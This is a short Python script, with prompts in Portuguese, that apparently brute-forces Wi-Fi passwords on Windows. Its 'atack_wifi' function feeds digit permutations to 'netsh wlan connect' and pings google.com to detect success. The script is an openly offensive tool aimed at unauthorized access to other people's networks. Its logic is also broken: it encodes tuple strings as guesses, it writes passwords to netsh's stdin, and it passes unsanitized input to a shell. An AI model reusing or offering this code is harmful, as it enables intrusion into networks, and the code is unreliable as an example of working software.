from subprocess import Popen, STDOUT, PIPE, call
from time import sleep
from itertools import permutations

def connect_wifi():
    print("digite o nome da rede wifi :")
    nome = input()
    manipulador = Popen('netsh wlan connect {}'.format(nome), shell=True, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
    sleep(2)
    manipulador.stdin.write(b'87654321\n')
    while manipulador.poll() == None:
        print(manipulador.stdout.readline().strip())
    #if call('ping -n 1 www.google.com') == 0:
    print('conectado')
    #else: print("tentativa falha")

def atack_wifi():
    print("digite o SSID da rede wifi:")
    nome = input()
    def testar(senha):
        manipulador = Popen('netsh wlan connect {}'.format(nome), shell=False, stdout=PIPE, stderr=STDOUT, stdin=PIPE)
        manipulador.stdin.write(senha)
        while manipulador.poll() == None:
            print(manipulador.stdout.readline().strip())
        if call('ping -n 1 www.google.com') == 0:
            print("conectado")
            print("key: {}".format(senha))
            exit()
        else: print("{} não é a senha".format(senha))

    #alfabeto = "bcdfghjklmnpqrstvwxyz"
    alfanumerico = "1234567890"
    #especiais = "!@#$%&*§?"
    #vogais = "aeiou" * 2
    
    caracteres = alfanumerico# +alfabeto +  especiais + vogais
    
    for x in range(8, len(caracteres)+1):
        for y in permutations(caracteres, x):
            testar(str(y).encode('utf-8'))

if __name__ == "__main__":
    print("hello word")
    while True:
        command = input(">>> ")
        if command == "connect":
            connect_wifi()
        elif command == "start attack": atack_wifi()
        else: continue
